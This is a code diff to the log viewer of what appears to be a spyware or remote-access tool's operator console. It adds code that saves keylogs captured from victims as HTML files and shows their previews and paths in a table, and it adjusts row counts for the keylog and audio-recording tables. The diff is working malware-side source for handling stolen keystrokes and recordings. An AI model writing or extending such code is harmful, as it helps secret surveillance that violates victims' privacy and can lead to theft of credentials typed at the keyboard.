@@ -257,11 +257,26 @@ class LogViewer(QWidget, logViewerUi):
                 keylogs=self.downloading_keylogs_count
             ))
 
-            self.keylogsTable.setRowCount(self.downloading_keylogs_count-1)
+            # Generate File
+            path = os.path.join(self.keylogs_dir, data['payload']['datetime']+'.html')
+            if not os.path.exists(path):
+                with open(path, 'wb') as screenshot_file:
+                    screenshot_file.write(data['payload']['raw'])
+
+            self.keylogsTable.setRowCount(self.downloading_keylogs_count)
             # Add Data
             item = QTableWidgetItem(data['payload']['datetime'])
             item.setTextColor(QColor('#f39c12'))
             self.keylogsTable.setItem(self.downloaded_keylogs-1, 0, item)
+
+            # Add Preview
+            keylog_preview = open(path, 'r').readline()
+            item = QTableWidgetItem(keylog_preview)
+            self.keylogsTable.setItem(self.downloaded_keylogs-1, 1, item)
+
+            # Add Path
+            item = QTableWidgetItem(path)
+            self.keylogsTable.setItem(self.downloaded_keylogs-1, 2, item)
 
         elif type == 'audio':
             self.downloaded_audios += 1
@@ -277,7 +292,7 @@ class LogViewer(QWidget, logViewerUi):
                 with open(path, 'wb') as audio_file:
                     audio_file.write(data['payload']['raw'])
 
-            self.audioTable.setRowCount(self.downloading_audios_count-1)
+            self.audioTable.setRowCount(self.downloading_audios_count)
 
             # Add Audio Duration
             item = QTableWidgetItem(audio_duration(path))
